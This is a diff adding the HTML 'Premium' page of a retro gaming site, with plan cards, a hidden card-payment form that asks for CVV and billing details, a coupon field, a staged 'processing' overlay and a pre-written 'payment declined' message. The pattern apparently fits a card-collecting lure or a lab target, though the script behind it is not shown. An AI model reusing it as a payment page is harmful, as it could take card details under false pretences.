@@ -1,0 +1,266 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Premium - PixelAddict</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Press+Start+2P&family=Space+Grotesk:wght@400;500;600&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="/assets/styles/main.css">
+    <script src="/assets/scripts/main.js" defer></script>
+</head>
+<body class="page">
+    <a class="sr-only" href="#main-content">Skip to content</a>
+    <header>
+        <div class="container site-header">
+            <a class="brand" href="/">
+                <span class="brand__mark" aria-hidden="true"></span>
+                <span class="brand__text">PixelAddict</span>
+            </a>
+            <button class="nav-toggle" type="button" aria-expanded="false" aria-controls="primary-navigation">
+                <span class="sr-only">Toggle navigation</span>
+                Menu
+            </button>
+            <nav class="primary-nav" id="primary-navigation">
+                <ul class="primary-nav__list" role="list">
+                    <li><a class="primary-nav__link" href="/">Home</a></li>
+                    <li><a class="primary-nav__link" href="/about">About</a></li>
+                    <li><a class="primary-nav__link" href="/premium" aria-current="page">Premium</a></li>
+                    <li><a class="primary-nav__link" href="/contact">Contact</a></li>
+                    <li><a class="primary-nav__link" href="/login">Login</a></li>
+                </ul>
+            </nav>
+        </div>
+    </header>
+
+    <main id="main-content">
+        <section class="page-hero">
+            <div class="container page-hero__content">
+                <p class="page-hero__eyebrow">Premium transmissions</p>
+                <h1 class="page-hero__headline">An invite-only tier for players who want even more neon in their night.</h1>
+                <p class="page-hero__description">Every game on PixelAddict remains free to play. Premium perks unlock early access builds, cosmetic drops, and deeper community events. We're testing the experience with a small crew before flipping the switch for everyone.</p>
+                <div class="page-hero__actions">
+                    <a class="button button--primary" href="mailto:contact@pixeladdict.tech?subject=Premium%20Waitlist">Join the waitlist</a>
+                    <a class="button button--ghost" href="/#games">Explore free library</a>
+                </div>
+            </div>
+        </section>
+
+        <section class="section">
+            <div class="container">
+                <div class="section__heading">
+                    <p class="section__eyebrow">What's cooking</p>
+                    <h2 class="section__title">Perks we are polishing right now</h2>
+                    <p class="section__description">Our internal roadmap is packed with extras that respect the free-first philosophy while rewarding the players who keep the signal strong.</p>
+                </div>
+                <div class="info-grid">
+                    <article class="info-card">
+                        <h3 class="info-card__title">Early access builds</h3>
+                        <p class="info-card__description">Playtest upcoming cabinets, give feedback directly to the dev team, and help balance before global launch.</p>
+                        <ul class="info-card__list">
+                            <li>Exclusive weekend play windows</li>
+                            <li>Private feedback threads with the devs</li>
+                            <li>Badges for top bug hunters</li>
+                        </ul>
+                    </article>
+                    <article class="info-card">
+                        <h3 class="info-card__title">Cosmetic drops</h3>
+                        <p class="info-card__description">Unlock animated avatars, retro HUD skins, and limited-time celebration effects that won't impact competitive balance.</p>
+                        <ul class="info-card__list">
+                            <li>Seasonal loot cycles tied to events</li>
+                            <li>Community-designed vanity rewards</li>
+                            <li>Sync cosmetics across all devices</li>
+                        </ul>
+                    </article>
+                    <article class="info-card">
+                        <h3 class="info-card__title">Deeper events</h3>
+                        <p class="info-card__description">Premium pilots can co-host tournaments, join dev AMAs, and vote on the next round of remasters.</p>
+                        <ul class="info-card__list">
+                            <li>Quarterly invitational tournaments</li>
+                            <li>Behind-the-scenes production streams</li>
+                            <li>Roadmap polling with weighted votes</li>
+                        </ul>
+                    </article>
+                </div>
+            </div>
+        </section>
+
+        <div id="premium-page">
+            <section class="section section--alt">
+                <div class="container">
+                    <div class="section__heading">
+                        <p class="section__eyebrow">Planned tiers</p>
+                        <h2 class="section__title">Choose the lane that fits your arcade obsession</h2>
+                        <p class="section__description">What you see in the free library is only 0.1% of the full PixelAddict vault. These plans unlock early builds, cosmetics, merch drops, and more once the premium wave opens.</p>
+                    </div>
+                    <div class="pricing-grid premium-plan-grid">
+                        <article class="pricing-card premium-plan">
+                            <span class="status-pill">Monthly access</span>
+                            <h3 class="pricing-card__title">Arcade Transmission</h3>
+                            <p class="pricing-card__price">$5.99</p>
+                            <p class="pricing-card__description">Keep your retro reactor charged with a rolling monthly pass.</p>
+                            <ul class="pricing-card__list">
+                                <li>500+ premium games</li>
+                                <li>Monthly new releases &amp; ad-free play</li>
+                                <li>Priority support &amp; exclusive merch</li>
+                                <li>Retro poster shipped each quarter</li>
+                            </ul>
+                            <button class="button button--primary button--block" type="button" id="monthly-btn">Start monthly</button>
+                        </article>
+                        <article class="pricing-card premium-plan premium-plan--highlight">
+                            <span class="status-pill">Best value</span>
+                            <h3 class="pricing-card__title">Signal Annual</h3>
+                            <p class="pricing-card__price">$49.99</p>
+                            <p class="pricing-card__description">Lock in the signal for a full year and join the founders circle.</p>
+                            <ul class="pricing-card__list">
+                                <li>All monthly perks for 30% less</li>
+                                <li>Annual collector's box &amp; limited items</li>
+                                <li>Founders badge &amp; private roadmap polls</li>
+                                <li>Invite-only community tournaments</li>
+                            </ul>
+                            <button class="button button--ghost button--block" type="button" id="annual-btn">Start annual</button>
+                        </article>
+                    </div>
+                </div>
+            </section>
+
+            <section class="section">
+                <div class="container page-cta">
+                    <h2 class="section__title">We build this with you</h2>
+                    <p class="page-cta__description">Your feedback ensures Premium stays fair, optional, and worth the upgrade. Share what you want to see, and we'll fold it into the roadmap.</p>
+                    <div class="page-cta__actions">
+                        <a class="button button--primary" href="mailto:contact@pixeladdict.tech?subject=Premium%20Feedback">Share feedback</a>
+                        <a class="button" href="/about">Meet the team</a>
+                    </div>
+                </div>
+            </section>
+        </div>
+
+        <section class="section" id="payment-page" hidden>
+            <div class="container premium-payment">
+                <button class="button button--ghost premium-payment__back" type="button" id="back-btn">Back to plans</button>
+                <div class="premium-payment__grid">
+                    <aside class="auth-card premium-payment__summary">
+                        <h2 class="section__title">Order summary</h2>
+                        <p class="premium-payment__lead">Complete the details below to activate your premium access.</p>
+                        <div class="order-summary">
+                            <div class="summary-line">
+                                <span>PixelAddict Premium (<span id="plan-type">Monthly</span>)</span>
+                                <span id="plan-price">$5.99</span>
+                            </div>
+                            <div class="summary-line">
+                                <span>Tax</span>
+                                <span id="tax-amount">$0.00</span>
+                            </div>
+                            <div class="summary-line summary-line--total">
+                                <strong>Total</strong>
+                                <strong id="total-amount">$5.99</strong>
+                            </div>
+                        </div>
+                        <ul class="premium-payment__benefits">
+                            <li>Early access play windows</li>
+                            <li>Community cosmetic drops</li>
+                            <li>Exclusive merch shipments</li>
+                        </ul>
+                    </aside>
+                    <form class="auth-card premium-payment__form" id="payment-form" novalidate>
+                        <div class="form-field">
+                            <label for="email">Email address</label>
+                            <input type="email" id="email" name="email" autocomplete="email" placeholder="your@email.com" required>
+                        </div>
+                        <div class="form-grid form-grid--split">
+                            <div class="form-field">
+                                <label for="firstName">First name</label>
+                                <input type="text" id="firstName" name="firstName" autocomplete="given-name" placeholder="John" required>
+                            </div>
+                            <div class="form-field">
+                                <label for="lastName">Last name</label>
+                                <input type="text" id="lastName" name="lastName" autocomplete="family-name" placeholder="Doe" required>
+                            </div>
+                        </div>
+                        <div class="form-field">
+                            <label for="cardNumber">Card number</label>
+                            <input type="text" id="cardNumber" name="cardNumber" inputmode="numeric" placeholder="1234 5678 9012 3456" maxlength="19" required>
+                        </div>
+                        <div class="form-grid form-grid--split">
+                            <div class="form-field">
+                                <label for="expiryDate">Expiry date</label>
+                                <input type="text" id="expiryDate" name="expiryDate" inputmode="numeric" placeholder="MM/YY" maxlength="5" required>
+                            </div>
+                            <div class="form-field">
+                                <label for="cvv">CVV</label>
+                                <input type="text" id="cvv" name="cvv" inputmode="numeric" placeholder="123" maxlength="4" required>
+                            </div>
+                        </div>
+                        <div class="form-field">
+                            <label for="address">Billing address</label>
+                            <input type="text" id="address" name="address" autocomplete="street-address" placeholder="123 Retro Street" required>
+                        </div>
+                        <div class="form-grid form-grid--split">
+                            <div class="form-field">
+                                <label for="city">City</label>
+                                <input type="text" id="city" name="city" autocomplete="address-level2" placeholder="Gaming City" required>
+                            </div>
+                            <div class="form-field">
+                                <label for="zipCode">ZIP code</label>
+                                <input type="text" id="zipCode" name="zipCode" inputmode="numeric" placeholder="12345" required>
+                            </div>
+                        </div>
+                        <div class="coupon-box">
+                            <h3 class="coupon-box__title">Have a coupon code?</h3>
+                            <div class="form-field">
+                                <label class="sr-only" for="couponCode">Coupon code</label>
+                                <input type="text" id="couponCode" name="couponCode" placeholder="Enter coupon code">
+                            </div>
+                            <button class="button button--subtle button--block" type="button" id="apply-coupon-btn">Apply coupon</button>
+                        </div>
+                        <div class="form-alert form-alert--error" id="error-message" role="alert" hidden>
+                            Payment failed, your payment was declined. Please try a different payment method or contact us at <a class="link-inline" href="mailto:payment@pixeladdict.tech">payment@pixeladdict.tech</a> for assistance.
+                        </div>
+                        <button class="button button--primary button--block" type="submit">Complete payment</button>
+                    </form>
+                </div>
+            </div>
+        </section>
+    </main>
+
+    <div class="loading-overlay" id="loading-overlay" hidden>
+        <div class="loading-overlay__panel">
+            <div class="loading-spinner" aria-hidden="true"></div>
+            <p class="loading-text" role="status">Processing payment...</p>
+            <div class="processing-steps">
+                <div class="processing-step" id="step1">
+                    <span class="step-dot" aria-hidden="true"></span>
+                    <span>Validating payment information</span>
+                </div>
+                <div class="processing-step" id="step2">
+                    <span class="step-dot" aria-hidden="true"></span>
+                    <span>Connecting to secure payment gateway</span>
+                </div>
+                <div class="processing-step" id="step3">
+                    <span class="step-dot" aria-hidden="true"></span>
+                    <span>Contacting your bank for authorization</span>
+                </div>
+                <div class="processing-step" id="step4">
+                    <span class="step-dot" aria-hidden="true"></span>
+                    <span>Finalizing transaction</span>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <footer>
+        <div class="container footer__content">
+            <nav class="footer__links" aria-label="Footer">
+                <a href="/">Home</a>
+                <a href="/about">About</a>
+                <a href="/premium" aria-current="page">Premium</a>
+                <a href="/contact">Contact</a>
+                <a href="/login">Login</a>
+            </nav>
+            <p>© PixelAddict. Broadcasting retro energy across the grid.</p>
+        </div>
+    </footer>
+</body>
+</html>
